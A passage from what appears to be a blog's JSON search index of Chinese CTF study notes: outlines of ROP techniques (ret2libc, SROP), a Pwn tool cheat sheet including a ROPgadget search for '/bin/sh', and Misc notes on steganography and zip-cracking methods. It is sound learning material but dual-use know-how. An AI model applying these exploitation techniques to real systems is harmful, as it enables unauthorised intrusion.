rel=\"external\">ret2syscall攻击技术示例</a></li>\n</ul>\n<h3 id=\"Ret2Libc\"><a href=\"#Ret2Libc\" class=\"headerlink\" title=\"Ret2Libc\"></a>Ret2Libc</h3><p>ret2libc即控制函数的执行 libc中的函数，通常是返回至某个函数的plt处或者函数的具体位置(即函数对应的got表项的内容)</p>\n<ul>\n<li><a href=\"/CTF/Writeup/RoutineTraining-Pwn/#R0pbaby\">Defcon 2015 Qualifier：R0pbaby</a></li>\n</ul>\n<h2 id=\"Advanced-ROP\"><a href=\"#Advanced-ROP\" class=\"headerlink\" title=\"Advanced ROP\"></a>Advanced ROP</h2><h3 id=\"Ret2-libc-scu-init\"><a href=\"#Ret2-libc-scu-init\" class=\"headerlink\" title=\"Ret2__libc_scu_init\"></a>Ret2__libc_scu_init</h3><h3 id=\"Ret2-dl-resolve\"><a href=\"#Ret2-dl-resolve\" class=\"headerlink\" title=\"Ret2 dl_resolve\"></a>Ret2 dl_resolve</h3><h3 id=\"SROP\"><a href=\"#SROP\" class=\"headerlink\" title=\"SROP\"></a>SROP</h3>","categories":["CTF","Pwn"],"tags":["Pwn"]},{"title":"Pwn","url":"https://xuccc.github.io/CTF/Pwn/Pwn/","content":"<p><a name=\"%E9%80%9A%E7%94%A8%E6%8A%80%E5%B7%A7\"></a></p>\n<h2 id=\"通用技巧\"><a href=\"#通用技巧\" class=\"headerlink\" title=\"通用技巧\"></a>通用技巧</h2><p><a name=\"linux%E5%91%BD%E4%BB%A4\"></a></p>\n<h3 id=\"Linux命令\"><a href=\"#Linux命令\" class=\"headerlink\" title=\"Linux命令\"></a>Linux命令</h3><p><a name=\"readelf\"></a></p>\n<h4 id=\"readelf\"><a href=\"#readelf\" class=\"headerlink\" title=\"readelf\"></a>readelf</h4><ul>\n<li><code>ELF header</code>: <code>readelf -h</code></li>\n<li><code>.dynamic</code> section: <code>readelf -d</code></li>\n<li><code>.rel.plt;.rel.dyn</code> section: <code>readelf -r</code></li>\n<li><code>.dynsym</code> section: <code>readelf -s</code></li>\n</ul>\n<p><a name=\"ropgadget\"></a></p>\n<h4 id=\"ROPgadget\"><a href=\"#ROPgadget\" class=\"headerlink\" title=\"ROPgadget\"></a>ROPgadget</h4><ul>\n<li><code>ROPgadget --binary bin --string  &quot;/bin/sh&quot;</code></li>\n</ul>\n<p><a name=\"gdb\"></a></p>\n<h3 id=\"GDB\"><a href=\"#GDB\" class=\"headerlink\" title=\"GDB\"></a>GDB</h3><p><a name=\"peda\"></a></p>\n<h4 id=\"peda\"><a href=\"#peda\" class=\"headerlink\" title=\"peda\"></a>peda</h4><p><a name=\"pwndbg\"></a></p>\n<h4 id=\"pwndbg\"><a href=\"#pwndbg\" class=\"headerlink\" title=\"pwndbg\"></a>pwndbg</h4><ul>\n<li>heap 命令不支持32位程序</li>\n</ul>\n<blockquote>\n<p>dpkg –add-architecture i386<br>apt-get install libc6:i386<br>apt-get install libc6-dbg:i386</p>\n</blockquote>\n<p><a name=\"pwntools\"></a></p>\n<h3 id=\"Pwntools\"><a href=\"#Pwntools\" class=\"headerlink\" title=\"Pwntools\"></a>Pwntools</h3><p><a name=\"%E6%A0%88%E6%BA%A2%E5%87%BA\"></a></p>\n<h2 id=\"栈溢出\"><a href=\"#栈溢出\" class=\"headerlink\" title=\"栈溢出\"></a><a href=\"/CTF/Pwn/栈溢出/index.html\">栈溢出</a></h2>","categories":["CTF","Pwn"],"tags":["Pwn"]},{"title":"Misc","url":"https://xuccc.github.io/CTF/Misc/Misc/","content":"<h2 id=\"编码转换\"><a href=\"#编码转换\" class=\"headerlink\" title=\"编码转换\"></a>编码转换</h2><ul>\n<li><p>Other</p>\n<ul>\n<li><p>代码类编码，附一个<a href=\"https://tio.run/#\" target=\"_blank\" rel=\"external\">在线编辑器</a></p>\n<blockquote>\n<p>知乎上有个<a href=\"https://www.zhihu.com/question/63387608\" target=\"_blank\" rel=\"external\">讨论帖</a><br><a href=\"https://esolangs.org/wiki/Hello_world_program_in_esoteric_languages\" target=\"_blank\" rel=\"external\">hello world in esoteric languages</a></p>\n</blockquote>\n<ul>\n<li><p><a href=\"http://tool.ph0en1x.com/brainfuck/\" target=\"_blank\" rel=\"external\">BrainFuck</a></p>\n<p><code>++++++++++[&gt;+++++++&gt;++++++++++&gt;+++&gt;+&lt;&lt;&lt;&lt;-]&gt;++.&gt;+.+++++++..+++.&gt;++.&lt;&lt;+++++++++++++++.&gt;.+++.------.--------.&gt;+.&gt;.</code></p>\n</li>\n<li><p><a href=\"http://tool.ph0en1x.com/brainfuck/\" target=\"_blank\" rel=\"external\">Ook</a></p>\n<p><code>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook!</code></p>\n</li>\n<li><p>JsFuck</p>\n<p><code>[ ]( ) ! +</code></p>\n</li>\n<li><p><a href=\"http://tmxk.org/jother/\" target=\"_blank\" rel=\"external\">Jother</a></p>\n<p><code>! + ( ) [ ] { }</code></p>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"数字取证-amp-amp-隐写分析\"><a href=\"#数字取证-amp-amp-隐写分析\" class=\"headerlink\" title=\"数字取证 &amp;&amp; 隐写分析\"></a>数字取证 &amp;&amp; 隐写分析</h2><h3 id=\"图片\"><a href=\"#图片\" class=\"headerlink\" title=\"图片\"></a>图片</h3><h4 id=\"通用技巧\"><a href=\"#通用技巧\" class=\"headerlink\" title=\"通用技巧\"></a>通用技巧</h4><h5 id=\"常用命令\"><a href=\"#常用命令\" class=\"headerlink\" title=\"常用命令\"></a>常用命令</h5><ul>\n<li><a href=\"https://www.imagemagick.org/script/escape.php\" target=\"_blank\" rel=\"external\">identift -format 参数</a></li>\n</ul>\n<h4 id=\"PNG\"><a href=\"#PNG\" class=\"headerlink\" title=\"PNG\"></a>PNG</h4><ul>\n<li><p>LSB隐写</p>\n</li>\n<li><p>Steg Software</p>\n</li>\n</ul>\n<h4 id=\"JPG\"><a href=\"#JPG\" class=\"headerlink\" title=\"JPG\"></a>JPG</h4><ul>\n<li>Steg Software</li>\n</ul>\n<h4 id=\"GIF\"><a href=\"#GIF\" class=\"headerlink\" title=\"GIF\"></a>GIF</h4><h5 id=\"文件格式\"><a href=\"#文件格式\" class=\"headerlink\" title=\"文件格式\"></a>文件格式</h5><ul>\n<li><a href=\"/CTF/Writeup/RoutineTraining-Misc/#mysterious-gif\">Break In 2017:Mysterious GIF</a> </li>\n</ul>\n<h5 id=\"时间轴\"><a href=\"#时间轴\" class=\"headerlink\" title=\"时间轴\"></a>时间轴</h5><h5 id=\"空间域\"><a href=\"#空间域\" class=\"headerlink\" title=\"空间域\"></a>空间域</h5><h3 id=\"音频文件\"><a href=\"#音频文件\" class=\"headerlink\" title=\"音频文件\"></a>音频文件</h3><ul>\n<li>频谱</li>\n<li>波形</li>\n<li>Steg Software</li>\n</ul>\n<h3 id=\"压缩包\"><a href=\"#压缩包\" class=\"headerlink\" title=\"压缩包\"></a>压缩包</h3><h4 id=\"Zip\"><a href=\"#Zip\" class=\"headerlink\" title=\"Zip\"></a>Zip</h4><ul>\n<li>爆破</li>\n<li>CRC32爆破</li>\n<li>明文攻击</li>\n<li>伪加密</li>\n</ul>\n<h3 id=\"流量包\"><a href=\"#流量包\" class=\"headerlink\" title=\"流量包\"></a>流量包</h3><h4 id=\"通用技巧-1\"><a href=\"#通用技巧-1\" class=\"headerlink\" title=\"通用技巧\"></a>通用技巧</h4><h5 id=\"Wireshark\"><a href=\"#Wireshark\" class=\"headerlink\" title=\"Wireshark\"></a>Wireshark</h5><h5 id=\"tshark\"><a href=\"#tshark\" class=\"headerlink\" title=\"tshark\"></a>tshark</h5><ul>\n<li><a href=\"/CTF/Writeup/RoutineTraining-Misc/#usb-probing\">AlexCTF-2017:USB probing</a></li>\n</ul>\n<h2 id=\"脑图\"><a href=\"#脑图\" class=\"headerlink\" title=\"脑图\"></a>脑图</h2><p><img src=\"/CTF/Misc/Misc/Misc.png\" alt=\"1\"></p>\n","categories":["CTF","Misc"],"tags":["Misc"]},{"title":"分类","url":"https://xuccc.github.io/categories/index.html","content":"","categories":[],"tags":[]},{"title":"标签","url":"https://xuccc.github.io/tags/index.html","content":"","categories":[],"tags":[]}]